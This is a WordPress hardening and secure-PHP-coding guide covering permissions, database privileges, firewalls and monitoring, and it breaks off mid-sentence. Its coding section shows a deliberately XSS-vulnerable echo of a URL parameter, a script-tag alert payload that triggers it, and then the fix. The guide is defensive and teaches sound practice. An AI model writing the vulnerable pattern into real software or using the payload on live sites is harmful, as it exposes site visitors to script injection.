# Custom Plug-in's Required Wordpress Security Best Practices  

[**[What is
Security?]{.underline}**](https://developer.wordpress.org/advanced-administration/security/hardening/#what-is-security)

Fundamentally, security *is not* about perfectly secure systems. Such a
thing might well be impractical, or impossible to find and/or maintain.
What security is though is risk reduction, not risk elimination. It's
about employing all the appropriate controls available to you, within
reason, that allow you to improve your overall posture reducing the odds
of making yourself a target, subsequently getting hacked.

**Website Hosts**

Often, a good place to start when it comes to website security is your
hosting environment. Today, there are a number of options available to
you, and while hosts offer security to a certain level, it's important
to understand where their responsibility ends and yours begins. Here is
a good article explaining the complicated dynamic between [[web hosts
and the security of your
website]{.underline}](https://perezbox.com/2014/11/how-hosts-manage-your-website-security/).
A secure server protects the privacy, integrity, and availability of the
resources under the server administrator's control.

Qualities of a trusted web host might include:

-   Readily discusses your security concerns and which security features
    and processes they offer with their hosting.

-   Provides the most recent stable versions of all server software.

-   Provides reliable methods for backup and recovery.

Decide which security you need on your server by determining the
software and data that needs to be secured. The rest of this guide will
help you with this.

**Website Applications**

It's easy to look at web hosts and pass the responsibility of security
to them, but there is a tremendous amount of security that lies on the
website owner as well. Web hosts are often responsible for the
infrastructure on which your website sits, they are not responsible for
the application you choose to install.

To understand where and why this is important you must [[understand how
websites get
hacked]{.underline}](https://blog.sucuri.net/2015/05/website-security-how-do-websites-get-hacked.html),
Rarely is it attributed to the infrastructure, and most often attributed
to the application itself (i.e., the environment you are responsible
for).

[**[Security
Themes]{.underline}**](https://developer.wordpress.org/advanced-administration/security/hardening/#security-themes)

Keep in mind some general ideas while considering security for each
aspect of your system:

**Limiting access**

Making smart choices that reduce possible entry points available to a
malicious person.

**Containment**

Your system should be configured to minimize the amount of damage that
can be done in the event that it is compromised.

**Preparation and knowledge**

Keeping backups and knowing the state of your WordPress installation at
regular intervals. Having a plan to backup and recover your installation
in the case of catastrophe can help you get back online faster in the
case of a problem.

**Trusted Sources**

Do not get plugins/themes from untrusted sources. Restrict yourself to
the WordPress.org repository or well known companies. Trying to get
plugins/themes from the outside [[may lead to
issues]{.underline}](https://blog.sucuri.net/2014/03/unmasking-free-premium-wordpress-plugins.html).

[**[Vulnerabilities on Your
Computer]{.underline}**](https://developer.wordpress.org/advanced-administration/security/hardening/#vulnerabilities-on-your-computer)

Make sure the computers you use are free of spyware, malware, and virus
infections. No amount of security in WordPress or on your web server
will make the slightest difference if there is a keylogger on your
computer.

Always keep your operating system and the software on it, especially
your web browser, up to date to protect you from security
vulnerabilities. If you are browsing untrusted sites, we also recommend
using tools like no-script (or disabling javascript/flash/java) in your
browser.

[**[Vulnerabilities in
WordPress]{.underline}**](https://developer.wordpress.org/advanced-administration/security/hardening/#vulnerabilities-in-wordpress)

Like many modern software packages, WordPress is updated regularly to
address new security issues that may arise. Improving software security
is always an ongoing concern, and to that end **you should always keep
up to date with the latest version of WordPress**. Older versions of
WordPress are not maintained with security updates.

**Updating WordPress**

Main article: [[Updating
WordPress]{.underline}](https://wordpress.org/documentation/article/updating-wordpress/).

The latest version of WordPress is always available from the main
WordPress website at https://wordpress.org. Official releases are not
available from other sites --- **never** download or install WordPress
from any website other than https://wordpress.org.

Since version 3.7, WordPress has featured automatic updates. Use this
functionality to ease the process of keeping up to date. You can also
use the WordPress Dashboard to keep informed about updates. Read the
entry in the Dashboard or the WordPress Developer Blog to determine what
steps you must take to update and remain secure.

If a vulnerability is discovered in WordPress and a new version is
released to address the issue, the information required to exploit the
vulnerability is almost certainly in the public domain. This makes old
versions more open to attack, and is one of the primary reasons you
should always keep WordPress up to date.

If you are an administrator in charge of more than one WordPress
installation, consider
using [[Subversion]{.underline}](https://codex.wordpress.org/Installing/Updating_WordPress_with_Subversion) to
make management easier.

**Reporting Security Issues**

If you think you have found a security flaw in WordPress, you can help
by reporting the issue. See the [[Security
FAQ]{.underline}](https://make.wordpress.org/core/handbook/testing/reporting-security-vulnerabilities/) for
information on how to report security issues.

If you think you have found a bug, report it. See [[Submitting
Bugs]{.underline}](https://make.wordpress.org/core/handbook/testing/reporting-bugs/) for
how to do this. You might have uncovered a vulnerability, or a bug that
could lead to one.

[**[Web Server
Vulnerabilities]{.underline}**](https://developer.wordpress.org/advanced-administration/security/hardening/#web-server-vulnerabilities)

The web server running WordPress, and the software on it, can have
vulnerabilities. Therefore, make sure you are running secure, stable
versions of your web server and the software on it, or make sure you are
using a trusted host that takes care of these things for you.

If you're on a shared server (one that hosts other websites besides your
own) and a website on the same server is compromised, your website can
potentially be compromised too even if you follow everything in this
guide. Be sure to ask your [[web
host]{.underline}](https://wordpress.org/documentation/article/glossary/#Hosting_provider) what
security precautions they take.

[**[Network
Vulnerabilities]{.underline}**](https://developer.wordpress.org/advanced-administration/security/hardening/#network-vulnerabilities)

The network on both ends --- the WordPress server side and the client
network side --- should be trusted. That means updating firewall rules
on your home router and being careful about what networks you work from.
An Internet cafe where you are sending passwords over an unencrypted
connection, wireless or otherwise, is **not** a trusted network.

Your web host should be making sure that their network is not
compromised by attackers, and you should do the same. Network
vulnerabilities can allow passwords and other sensitive information to
be intercepted.

[**[Passwords]{.underline}**](https://developer.wordpress.org/advanced-administration/security/hardening/#passwords)

Many potential vulnerabilities can be avoided with good security habits.
A strong password is an important aspect of this.

The goal with your password is to make it hard for other people to guess
and hard for a [[brute force
attack]{.underline}](https://developer.wordpress.org/advanced-administration/security/brute-force/) to
succeed. Many [[automatic password
generators]{.underline}](https://www.google.com/?q=password+generator) are
available that can be used to create secure passwords.

WordPress also features a password strength meter which is shown when
changing your password in WordPress. Use this when changing your
password to ensure its strength is adequate.

Things to avoid when choosing a password:

-   Any permutation of your own real name, username, company name, or
    name of your website.

-   A word from a dictionary, in any language.

-   A short password.

-   Any numeric-only or alphabetic-only password (a mixture of both is
    best).

A strong password is necessary not just to protect your blog content. A
hacker who gains access to your administrator account is able to install
malicious scripts that can potentially compromise your entire server.

In addition to using a strong password, it's a good idea to
enable [[two-step
authentication]{.underline}](https://developer.wordpress.org/advanced-administration/security/mfa/) as
an additional security measure.

[**[FTP]{.underline}**](https://developer.wordpress.org/advanced-administration/security/hardening/#ftp)

When connecting to your server you should use SFTP encryption if your
web host provides it. If you are unsure if your web host provides SFTP
or not, just ask them.

Using SFTP is the same as FTP, except your password and other data is
encrypted as it is transmitted between your computer and your website.
This means your password is never sent in the clear and cannot be
intercepted by an attacker.

[**[File
Permissions]{.underline}**](https://developer.wordpress.org/advanced-administration/security/hardening/#file-permissions)

Some neat features of WordPress come from allowing various files to be
writable by the web server. However, allowing write access to your files
is potentially dangerous, particularly in a shared hosting environment.

It is best to lock down your file permissions as much as possible and to
loosen those restrictions on the occasions that you need to allow write
access, or to create specific folders with less restrictions for the
purpose of doing things like uploading files.

Here is one possible permission scheme.

All files should be owned by your user account, and should be writable
by you. Any file that needs write access from WordPress should be
writable by the web server, if your hosting set up requires it, that may
mean those files need to be group-owned by the user account used by the
web server process.

**/**

The root WordPress directory: all files should be writable only by your
user account, except .htaccess if you want WordPress to automatically
generate rewrite rules for you.

**/wp-admin/**

The WordPress administration area: all files should be writable only by
your user account.

**/wp-includes/**

The bulk of WordPress application logic: all files should be writable
only by your user account.

**/wp-content/**

User-supplied content: intended to be writable by your user account and
the web server process.

Within /wp-content/ you will find:

**/wp-content/themes/**

Theme files. If you want to use the built-in theme editor, all files
need to be writable by the web server process. If you do not want to use
the built-in theme editor, all files can be writable only by your user
account.

**/wp-content/plugins/**

Plugin files: all files should be writable only by your user account.

Other directories that may be present with /wp-content/ should be
documented by whichever plugin or theme requires them. Permissions may
vary.

**Changing file permissions**

If you have shell access to your server, you can change file permissions
recursively with the following command:

For Directories:

find /path/to/your/wordpress/install/ -type d -exec chmod 755 {} \\;

For Files:

find /path/to/your/wordpress/install/ -type f -exec chmod 644 {} \\;

**Regarding Automatic Updates**

When you tell WordPress to perform an automatic update, all file
operations are performed as the user that owns the files, not as the web
server's user. All files are set to 0644 and all directories are set to
0755, and writable by only the user and readable by everyone else,
including the web server.

[**[Database
Security]{.underline}**](https://developer.wordpress.org/advanced-administration/security/hardening/#database-security)

If you run multiple blogs on the same server, it is wise to consider
keeping them in separate databases each managed by a different user.
This is best accomplished when performing the initial [[WordPress
installation]{.underline}](https://developer.wordpress.org/advanced-administration/before-install/howto-install/).
This is a containment strategy: if an intruder successfully cracks one
WordPress installation, this makes it that much harder to alter your
other blogs.

If you administer MySQL yourself, ensure that you understand your MySQL
configuration and that unneeded features (such as accepting remote TCP
connections) are disabled. See [[Secure MySQL Database
Design]{.underline}](https://www.securityfocus.com/infocus/1667) for a
nice introduction.

**Restricting Database User Privileges**

For normal WordPress operations, such as posting blog posts, uploading
media files, posting comments, creating new WordPress users and
installing WordPress plugins, the MySQL database user only needs data
read and data write privileges to the MySQL database; SELECT, INSERT,
UPDATE and DELETE.

Therefore any other database structure and administration privileges,
such as DROP, ALTER and GRANT can be revoked. By revoking such
privileges you are also improving the containment policies.

**Note:** Some plugins, themes and major WordPress updates might require
to make database structural changes, such as add new tables or change
the schema. In such case, before installing the plugin or updating a
software, you will need to temporarily allow the database user the
required privileges.

**WARNING:** Attempting updates without having these privileges can
cause problems when database schema changes occur. Thus, it
is **NOT**recommended to revoke these privileges. If you do feel the
need to do this for security reasons, then please make sure that you
have a solid backup plan in place first, with regular whole database
backups which you have tested are valid and that can be easily restored.
A failed database upgrade can usually be solved by restoring the
database back to an old version, granting the proper permissions, and
then letting WordPress try the database update again. Restoring the
database will return it back to that old version and the WordPress
administration screens will then detect the old version and allow you to
run the necessary SQL commands on it. Most WordPress upgrades do not
change the schema, but some do. Only major point upgrades (3.7 to 3.8,
for example) will alter the schema. Minor upgrades (3.8 to 3.8.1) will
generally not. Nevertheless, **keep a regular backup**.

[**[Securing
wp-admin]{.underline}**](https://developer.wordpress.org/advanced-administration/security/hardening/#securing-wp-admin)

Adding server-side password protection (such
as [[BasicAuth]{.underline}](https://en.wikipedia.org/wiki/Basic_access_authentication))
to /wp-admin/adds a second layer of protection around your blog's admin
area, the login screen, and your files. This forces an attacker or bot
to attack this second layer of protection instead of your actual admin
files. Many WordPress attacks are carried out autonomously by malicious
software bots.

Simply securing the wp-admin/ directory might also break some WordPress
functionality, such as the AJAX handler at wp-admin/admin-ajax.php. See
the [[Resources]{.underline}](https://developer.wordpress.org/advanced-administration/resources/) section
for more documentation on how to password protect
your wp-admin/ directory properly.

The most common attacks against a WordPress blog usually fall into two
categories.

1.  Sending specially-crafted HTTP requests to your server with specific
    exploit payloads for specific vulnerabilities. These include
    old/outdated plugins and software.

2.  Attempting to gain access to your blog by using "brute-force"
    password guessing.

The ultimate implementation of this "second layer" password protection
is to require an HTTPS SSL encrypted connection for administration, so
that all communication and sensitive data is
encrypted. *See [[Administration Over
SSL]{.underline}](https://developer.wordpress.org/advanced-administration/security/https/).*

[**[Securing
wp-includes]{.underline}**](https://developer.wordpress.org/advanced-administration/security/hardening/#securing-wp-includes)

A second layer of protection can be added where scripts are generally
not intended to be accessed by any user. One way to do that is to block
those scripts using mod_rewrite in the .htaccess file. **Note:** to
ensure the code below is not overwritten by WordPress, place it outside
the # BEGIN WordPress and # END WordPress tags in the .htaccess file.
WordPress can overwrite anything between these tags.

\# Block the include-only files.

\<IfModule mod_rewrite.c\>

RewriteEngine On

RewriteBase /

RewriteRule \^wp-admin/includes/ - \[F,L\]

RewriteRule !\^wp-includes/ - \[S=3\]

RewriteRule \^wp-includes/\[\^/\]+\\.php\$ - \[F,L\]

RewriteRule \^wp-includes/js/tinymce/langs/.+\\.php - \[F,L\]

RewriteRule \^wp-includes/theme-compat/ - \[F,L\]

\</IfModule\>

\# BEGIN WordPress

Note that this won't work well on Multisite, as RewriteRule
\^wp-includes/\[\^/\]+\\.php\$ - \[F,L\] would prevent the ms-files.php
file from generating images. Omitting that line will allow the code to
work, but offers less security.

[**[Securing
wp-config.php]{.underline}**](https://developer.wordpress.org/advanced-administration/security/hardening/#securing-wp-config-php)

You can move the wp-config.php file to the directory above your
WordPress install. This means for a site installed in the root of your
webspace, you can store wp-config.php outside the web-root folder.

**Note:** Some people assert that [[moving wp-config.php has minimal
security
benefits]{.underline}](https://wordpress.stackexchange.com/questions/58391/is-moving-wp-config-outside-the-web-root-really-beneficial) and,
if not done carefully, may actually introduce serious
vulnerabilities. [[Others
disagree]{.underline}](https://wordpress.stackexchange.com/questions/58391/is-moving-wp-config-outside-the-web-root-really-beneficial/74972#74972).

Note that wp-config.php can be stored ONE directory level above the
WordPress (where wp-includes resides) installation. Also, make sure that
only you (and the web server) can read this file (it generally means a
400 or 440 permission).

If you use a server with .htaccess, you can put this in that file (at
the very top) to deny access to anyone surfing for it:

\<Files \"wp-config.php\"\>

Require all denied

\</Files\>

[**[Disable File
Editing]{.underline}**](https://developer.wordpress.org/advanced-administration/security/hardening/#disable-file-editing)

The WordPress Dashboard by default allows administrators to edit PHP
files, such as plugin and theme files. This is often the first tool an
attacker will use if able to login, since it allows code execution.
WordPress has a constant to disable editing from Dashboard. Placing this
line in wp-config.php is equivalent to removing the 'edit_themes',
'edit_plugins' and 'edit_files' capabilities of all users:

define( \'DISALLOW_FILE_EDIT\', true );

This will not prevent an attacker from uploading malicious files to your
site, but might stop some attacks.

[**[Plugins]{.underline}**](https://developer.wordpress.org/advanced-administration/security/hardening/#plugins)

First of all, make sure your plugins are always updated. Also, if you
are not using a specific plugin, delete it from the system.

**Firewall**

There are many plugins and services that can act as a firewall for your
website. Some of them work by modifying your .htaccess\
file and restricting some access at the Apache level, before it is
processed by WordPress. A good example is [[iThemes
Security]{.underline}](https://wordpress.org/plugins/better-wp-security/) or [[All
in One WP
Security]{.underline}](https://wordpress.org/plugins/all-in-one-wp-security-and-firewall/).
Some firewall plugins act at the WordPress level,
like [[WordFence]{.underline}](https://wordpress.org/plugins/wordfence/) and [[Shield]{.underline}](https://wordpress.org/plugins/wp-simple-firewall/),
and try to filter attacks as WordPress is loading, but before it is
fully processed.

Besides plugins, you can also install a WAF (web firewall) at your web
server to filter content before it is processed by WordPress. The most
popular open source WAF is ModSecurity.

A website firewall can also be added as intermediary between the traffic
from the internet and your hosting server. These services all function
as reverse proxies, in which they accept the initial requests and
reroute them to your server, stripping it of all malicious requests.
They accomplish this by modifying your DNS records, via an A record or
full DNS swap, allowing all traffic to pass through the new network
first. This causes all traffic to be filtered by the firewall before
reaching your site. A few companies offer such service,
like [[CloudFlare]{.underline}](https://www.cloudflare.com/), [[Sucuri]{.underline}](https://sucuri.net/wordpress-security/) and [[Incapsula]{.underline}](https://www.imperva.com/).

Additionally, these third parties service providers function as Content
Distribution Network (CDNs) by default, introducing performance
optimization and global reach.

**Plugins that need write access**

If a plugin wants write access to your WordPress files and directories,
please read the code to make sure it is legit or check with someone you
trust. Possible places to check are the [[Support
Forums]{.underline}](https://wordpress.org/support/welcome/) and [[IRC
Channel]{.underline}](https://make.wordpress.org/support/handbook/appendix/other-support-locations/introduction-to-irc/).

**Code execution plugins**

As we said, part of the goal of hardening WordPress is containing the
damage done if there is a successful attack. Plugins which allow
arbitrary PHP or other code to execute from entries in a database
effectively magnify the possibility of damage in the event of a
successful attack.

A way to avoid using such a plugin is to use [[custom page
templates]{.underline}](https://wordpress.org/documentation/article/pages/#Creating_your_own_Page_Templates) that
call the function. Part of the security this affords is active only when
you [[disallow file editing within
WordPress]{.underline}](https://developer.wordpress.org/advanced-administration/security/hardening/#File_Permissions).

[**[Security through
obscurity]{.underline}**](https://developer.wordpress.org/advanced-administration/security/hardening/#security-through-obscurity)

[[Security through
obscurity]{.underline}](https://en.wikipedia.org/wiki/Security_through_obscurity) is
generally an unsound primary strategy. However, there are areas in
WordPress where obscuring information *might*help with security:

1.  **Rename the administrative account:** When creating an
    administrative account, avoid easily guessed terms such
    as admin or webmaster as usernames because they are typically
    subject to attacks first. On an existing WordPress install you may
    rename the existing account in the MySQL command-line client with a
    command like:

UPDATE wp_users SET user_login = \'newuser\' WHERE user_login =
\'admin\';

or by using a MySQL frontend
like [[phpMyAdmin]{.underline}](https://developer.wordpress.org/advanced-administration/upgrade/phpmyadmin/).\
2. **Change the table_prefix:** Many published WordPress-specific
SQL-injection attacks make the assumption that the table_prefix is wp\_,
the default. Changing this can block at least some SQL injection
attacks.

[**[Data
Backups]{.underline}**](https://developer.wordpress.org/advanced-administration/security/hardening/#data-backups)

Back up your data regularly, including your MySQL databases. See the
main article: [[Backing Up Your
Database]{.underline}](https://developer.wordpress.org/advanced-administration/security/backup/database/).

Data integrity is critical for trusted backups. Encrypting the backup,
keeping an independent record of MD5 hashes for each backup file, and/or
placing backups on read-only media increases your confidence that your
data has not been tampered with.

A sound backup strategy could include keeping a set of regularly-timed
snapshots of your entire WordPress installation (including WordPress
core files and your database) in a trusted location. Imagine a site that
makes weekly snapshots. Such a strategy means that if a site is
compromised on May 1st but the compromise is not detected until May
12th, the site owner will have pre-compromise backups that can help in
rebuilding the site and possibly even post-compromise backups which will
aid in determining how the site was compromised.

[**[Logging]{.underline}**](https://developer.wordpress.org/advanced-administration/security/hardening/#logging)

Logs are your best friend when it comes to understanding what is
happening with your website, especially if you're trying to perform
forensics. Contrary to popular beliefs, logs allow you to see what was
done and by who and when. Unfortunately the logs will not tell you who,
username, logged in, but it will allow you to identify the IP and time
and more importantly, the actions the attacker might have taken. You
will be able to see any of these attacks via the logs -- Cross Site
Scripting (XSS), Remote File Inclusion (RFI), Local File Inclusion (LFI)
and Directory Traversal attempts. You will also be able to see brute
force attempts. There are various [[examples and
tutorials]{.underline}](https://blog.sucuri.net/2015/08/ask-sucuri-how-did-my-wordpress-website-get-hacked-a-tutorial.html) available
to help guide you through the process of parsing and analyzing your raw
logs.

If you get more comfortable with your logs you'll be able to see things
like, when the theme and plugin editors are being used, when someone
updates your widgets and when posts and pages are added. All key
elements when doing forensic work on your web server. The are a few
WordPress Security plugins that assist you with this as well, like
the [[Sucuri Auditing
tool]{.underline}](https://wordpress.org/plugins/sucuri-scanner/) or
the [[Audit
Trail]{.underline}](https://wordpress.org/plugins/audit-trail/) plugin.

There are two key open-source solutions you'll want on your web server
from a security perspective, this is a layered approach to security.

OSSEC can run on any NIX distribution and will also run on Windows. When
configured correctly its very powerful. The idea is correlate and
aggregate all the logs. You have to be sure to configure it to capture
all access_logs and error_logs and if you have multiple websites on the
server account for that. You'll also want to be sure to filter out the
noise. By default you'll see a lot of noise and you'll want to configure
it to be really effective.

[**[Monitoring]{.underline}**](https://developer.wordpress.org/advanced-administration/security/hardening/#monitoring)

Sometimes prevention is not enough and you may still be hacked. That's
why intrusion detection/monitoring is very important. It will allow you
to react faster, find out what happened and recover your site.

**Monitoring your logs**

If you are on a dedicated or virtual private server, in which you have
the luxury of root access, you have the ability easily configure things
so that you can see what's going
on. [[OSSEC]{.underline}](https://www.ossec.net/) easily facilitates
this and here is a little write up that might help you out [[OSSEC for
Website Security -- Part
I]{.underline}](https://perezbox.com/2013/03/ossec-for-website-security-part-i/).

**Monitoring your files for changes**

When an attack happens, it always leave traces. Either on the logs or on
the file system (new files, modified files, etc). If you are
using [[OSSEC]{.underline}](https://www.ossec.net/) for example, it will
monitor your files and alert you when they change.

**Goals**

The goals of file system tracking include:

-   Monitor changed and added files

-   Log changes and additions

-   Ability to revert granular changes

-   Automated alerts

**General approaches**

Administrators can monitor file system via general technologies such as:

-   System utilities

-   Revision control

-   OS/kernel level monitoring

**Specific tools**

Options for file system monitoring include:

-   [[diff]{.underline}](https://en.wikipedia.org/wiki/Diff_utility) --
    build clean test copy of your site and compare against production

-   [[Git]{.underline}](https://git-scm.com/) -- source code management

-   [[inotify]{.underline}](https://en.wikipedia.org/wiki/Inotify) and [[incron]{.underline}](https://inotify.aiken.cz/?section=incron&page=doc&lang=en) --
    OS kernel level file monitoring service that can run commands on
    filesystem events

-   [[Watcher]{.underline}](https://github.com/gregghz/Watcher/blob/master/jobs.yml) --
    Python inotify library

-   [[OSSEC]{.underline}](https://www.ossec.net/) -- Open Source
    Host-based Intrusion Detection System that performs log analysis,
    file integrity checking, policy monitoring, rootkit detection,
    real-time alerting and active response.

**Considerations**

When configuring a file based monitoring strategy, there are many
considerations, including the following.

**Run the monitoring script/service as root**

This would make it hard for attackers to disable or modify your file
system monitoring solution.

**Disable monitoring during scheduled maintenance/upgrades**

This would prevent unnecessary notifications when you are performing
regular maintenance on the site.

**Monitor only executable filetypes**

It may be reasonably safe to monitor only executable file types, such as
.php files, etc.. Filtering out non-executable files may reduce
unnecessary log entries and alerts.

**Use strict file system permissions**

Read about securing file permissions and ownership. In general, avoid
allowing *execute* and *write* permissions to the extent possible.

**Monitoring your web server externally**

If the attacker tries to deface your site or add malware, you can also
detect these changes by using a web-based integrity monitor solution.
This comes in many forms today, use your favorite search engine and look
for Web Malware Detection and Remediation and you'll likely get a long
list of service providers.

##     Basic Principles of Writing Secure PHP Code

Never Trust User Input

If you can memorize the above line "Never Trust User Input" and
incorporate it into your daily coding practices, you are already halfway
to writing more secure PHP code. The majority of vulnerabilities in PHP
code are caused by a developer that did not properly mistrust user
input. In other words, the developer did not include code to correctly
or sufficiently sanitize some form of user input.

In the [[Akismet vulnerability reported in October of
2015]{.underline}](https://blog.akismet.com/2015/10/13/akismet-3-1-5-wordpress/),
Akismet was not correctly sanitizing user input via comments, which led
to a Cross Site Scripting vulnerability (an XSS).

In August of 2015 a vulnerability in WordPress core was discovered where
WordPress core was 'trusting' user input to provide a valid post ID,
without verifying it. A 'subscriber' level user could use an invalid
post ID (along with a race condition) to [[elevate their privilege level
to a higher access
level]{.underline}](https://blog.checkpoint.com/2015/08/04/wordpress-vulnerabilities-1/).
If core had been correctly checking whether a post existed before
checking if a user had the correct level of access, the vulnerability
could have been avoided. We encourage you to read the [[vulnerability
disclosure]{.underline}](https://blog.checkpoint.com/2015/08/04/wordpress-vulnerabilities-1/) in
the latter case because it will give you a good idea of how closely your
code may be scrutinized by a researcher. \[Hint: VERY closely. This was
an extremely advanced vulnerability\]

The most recent 7 plugin vulnerabilities at the time of writing this are
all caused by incorrectly trusting user input. They are either XSS,
CSRF, RFI or SQL Injection vulnerabilities, all of which are caused by a
developer not correctly sanitizing user input before using it in the
application or by not sanitizing output before it is sent to the web
browser.

Remember this saying: "Sanitize input early, sanitize output late"

Our applications are not very useful without user input in the form of
comments, blog posts, star ratings, forms that visitors fill out and so
on. When data arrives in your web application from a site visitor's
browser, it needs to be sanitized as it arrives. You must ensure that
you sanitize it as soon as it arrives or as **early** as possible before
other parts of the application interact with the data.

Our web applications are also much more interesting when they can share
user input with other site visitors by sending it back to a web browser.
We might display comments, show published posts, share the results of a
survey with other site visitors and so on. All this data is stored user
input that is being **output **to the browser. Even if you've sanitized
this data as it arrives, it needs to be re-sanitized when it is
displayed to other site visitors.

When you sanitize output, you need to **sanitize as late as possible**.
That way you can be sure that it is not modified after it is sanitized
and you only sanitize it once: right before it is sent to the web
browser. That is why we invented the saying above: **Sanitize input
early, sanitize output late. **Use this as a reminder you need to
sanitize user data once as soon as it arrives and again right before it
leaves.

Sometimes you don't control input

Sometimes you might be receiving user input data from an API or a data
feed into your application. You might be relying on another application
to sanitize the data for you. Ideally you would re-sanitize any data
that arrives in your application, but this is not always feasible for
performance reasons or because the data is large and complex and it
would require a lot of code to sanitize it.

In this case you need to remember to, at the very least, sanitize the
output. It's easy to forget that data you are receiving from somewhere
other than your own application might also be user input data, and might
contain malicious code.

Sometimes you don't control the output

Occasionally you might receive data from users on your website and send
it to an external application via, for example, a REST API that you have
published. Make sure that you sanitize all user input early, as it
arrives in your application before you send it out via the API.

By doing this you help keep users of your data safe. You should not
assume that developers using your API are sanitizing data on their end
and that you can send them raw user input.

How to Sanitize, Validate and Escape Input

In the above discussion, we use the term 'sanitize' or 'sanitization' as
a global term to describe the idea of making sure that your data
arriving at an application is safe for the application to interact with,
and data leaving (being outputted) is safe for consumption.

There are three ways to make sure data is safe:

-   **Validation: **Validation makes sure that you have the right kind
    of data. For example, you might make sure that a field specifying a
    number of items in a cart is an integer by using PHP's is_numeric()
    function. If it returns false then you send an error back to the
    browser asking them for a valid integer. When you test input for
    valid data and return error messages to the user, that is
    validation.

-   **Sanitization: **This removes any harmful data. You might strip out
    \<script\> tags from form data. Or you might remove quotes from an
    HTML attribute before sending it to the browser. This is all
    sanitization because it removes harmful data.

-   **Escaping: **This takes any harmful data and makes it harmless. For
    example, you might escape HTML tags on output. If someone includes a
    \<script\> tag which can result in an XSS vulnerability, you might
    output it as &lt;script&gt; where you have escaped the greater and
    less than signs to make it harmless.

**Validation** routines are normally used in a conditional statement
e.g.

+---+---------------------------------------------------------------------+
| 1 | **if**(filter_var(\$address, FILTER_VALIDATE_EMAIL)){               |
|   |                                                                     |
| 2 |  echo \"Email is valid.\";                                          |
|   |                                                                     |
| 3 | } **else** {                                                        |
|   |                                                                     |
| 4 |  echo \"Not valid.\";                                               |
|   |                                                                     |
| 5 | }                                                                   |
+===+=====================================================================+
+---+---------------------------------------------------------------------+

**Sanitization** takes some data and cleans it for you, returning the
clean version. e.g.

+---+----------------------------------------------------------------------+
| 1 | //Remove all characters from the email except letters, digits and    |
|   | !#\$%&\'\*+-=?\^\_\`{\|}\~@.\[\]                                     |
| 2 |                                                                      |
|   |    echo filter_var(\$dirtyAddress, FILTER_SANITIZE_EMAIL);           |
+===+======================================================================+
+---+----------------------------------------------------------------------+

**Escaping **routines make potentially harmful data safe. They are
frequently used as follows:

+---+----------------------------------------------------------------------+
| 1 | \<?php                                                               |
|   |                                                                      |
| 2 | //Do some stuff that makes sure it\'s time to write data to the      |
|   | browser                                                              |
| 3 |                                                                      |
|   | ?\>                                                                  |
| 4 |                                                                      |
|   | Thanks **for** your order. Please visit us again. You ordered \<?php |
|   | echo esc_html(\$productName); ?\>.                                   |
+===+======================================================================+
+---+----------------------------------------------------------------------+

When to Sanitize, Validate and Escape

As we mentioned above, to ensure that your code and your application
users are safe, you need to make sure that your data is safe when it
arrives and when it leaves. That means you need to perform checks at
input and output.

At input: Validate and Sanitize

As data arrives your first step should be to validate it. Make sure
integers are in fact integers and that no unusual or disallowed data is
arriving in your application. The next step at input is to sanitize it
and strip out anything potentially harmful. You will rarely escape data
at input because your application will most likely need to work with the
raw data, and you have already made it safe by validating and
sanitizing.

At output: Sanitize and Escape

As data leaves your application, you need to remove any potentially
harmful data again through sanitization. The reason you sanitize again
on output is because a hacker may have tricked your application into
creating harmful data for output, so you need to re-check that your
output data is safe.

Then you need to escape the data to make sure it is suitable for
whatever medium it is being output to. You may need to turn HTML tags
into HTML entities to make them safe for the web browser. Or you may
need to remove single and double quotes if your output is going to be
used as an HTML attribute.

Output Vectors and Vulnerabilities

Most people think of output as writing from a PHP application back to
the web browser. But there are different places data leaves your
application and they are closely related to the kinds of vulnerabilities
that your code can introduce into an application. We discuss the
different kinds of output here. We have named these 'output vectors'
because the phrase 'attack vectors' is used to describe different entry
points into an application. 'Output vectors' we feel is an appropriate
term because where you write your data is closely tied to the
vulnerabilities or 'attack vectors' you introduce into your
application.\

The Visitor's Browser

The most common place data is sent to by a PHP application is to a site
visitor's web browser. This is trivial to do in PHP using the 'echo()'
function. Because it is so commonly used and so easy to do, it also
introduces the most common form of vulnerability in web applications:
The Cross Site Scripting, or XSS vulnerability.

Here is how easy it is to write an XSS vulnerability:

+---+---------------------------------------------------------------------+
| 1 | \<?php                                                              |
|   |                                                                     |
| 2 | echo \"You visited my URL with the following parameter: \" .        |
|   | \$\_GET\[\'value\'\];                                               |
+===+=====================================================================+
+---+---------------------------------------------------------------------+

If you visit a web page with the above code, and use a URL as follows:

+---+---------------------------------------------------------------------+
| 1 | https://example.com/?value=\<script\>// \<\![CDATA\[                |
|   |                                                                     |
| 2 | alert(\'1\');                                                       |
|   |                                                                     |
| 3 | // \]\]\>\</script\>                                                |
+===+=====================================================================+
+---+---------------------------------------------------------------------+

You will see an alert box appear. This simply proves that you can
execute javascript code fed to the application. To avoid this
vulnerability in a WordPress plugin, you should have done the following:

+---+----------------------------------------------------------------------+
| 1 | **if**(is_numeric(\$\_GET\[\'value\'\])){                            |
|   |                                                                      |
| 2 | echo \"You visited my URL with the following parameter: \" .         |
|   | intval(\$\_GET\[\'value\'\]);                                        |
| 3 |                                                                      |
|   | } **else** {                                                         |
| 4 |                                                                      |
|   | echo \"Hey. Stop trying to hack me by sending non-number values!\";  |
| 5 |                                                                      |
|   | exit();                                                              |
| 6 |                                                                      |
|   | }                                                                    |
+===+======================================================================+
+---+----------------------------------------------------------------------+

As you can see, we are first validating that we received a number as it
arrives in the application. Then we sanitize before output by stripping
out anything that isn't a number before sending the data back to the web
browser. We will go into more detail on XSS vulnerabilities in a later
section.

The Database

Another place data exits your application is into the database. A
database is a fully functioning application in its own right that can
respond to commands from your application. If you allow a visitor to
your website to send anything they want to your database, they could
persuade your database to give them all of your data, which would be a
disaster for your site members' privacy.

For this reason you need to make sure that any data sent to your
database is safe. The most common attack on your database is a SQL
injection attack. This is a way for an attacker to send arbitrary
commands to your database to either add or update data in an
unauthorized way, or read data they should not have access to, like
passwords or member email addresses.

Files

Many PHP applications and WordPress plugins write data to files. If an
attacker can trick an application into writing PHP code into a file with
the correct name, they can then execute that file and gain full access
to your website. For this reason it's important to make sure that data
being written to a file is safe, and the filename being used is safe
too.

One of the most famous vulnerabilities in WordPress was the TimThumb
vulnerability that fetched images from the web and stored them as files
on a website. An attacker could trick a WordPress plugin to fetch a PHP
file instead and store that on the filesystem of the website. The
attacker then visited the PHP file and it would execute. Using this
technique, the attacker could get the website to download malicious PHP
code and then execute that code.

The problem with the TimThumb vulnerability was that the application
never validated and sanitized the contents of the file it was fetching.
It also never sanitized and escaped the data it was writing to the file
when it saved it on the website's filesystem. And furthermore, it never
made sure that the filename being used was a non-executable filename. As
